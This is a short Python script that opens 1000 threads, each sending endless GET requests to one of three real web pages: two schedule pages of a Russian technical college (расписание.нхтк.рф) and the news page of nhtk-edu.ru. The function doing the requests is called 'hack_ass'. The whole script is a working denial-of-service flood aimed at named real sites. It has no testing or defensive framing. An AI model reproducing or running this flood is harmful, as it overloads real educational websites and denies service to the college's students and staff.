import requests
from threading import Thread

def hack_ass(id_thread: int, url: str):
    counter = 0
    while 1:
        r = requests.get(url)
        print("Номер потока -> ", id_thread,"запроса -> ", counter := counter + 1)
    
all_url = [
    "https://расписание.нхтк.рф/Василенко%C2%A0О.%C2%A0А..html#заголовок",
    "https://расписание.нхтк.рф/Абраменко%C2%A0Ю.%C2%A0В..html#заголовок",
    "https://nhtk-edu.ru/ru/home/newsandevents"
]
all_thread = []
counter = 0

while 1:
    if counter < 1000:
        t1 = Thread(target=hack_ass, args=(f"{counter}", all_url[counter % 3],), daemon=True)
        all_thread.append(t1)
        all_thread[counter].start()
        counter += 1
    else:
        pass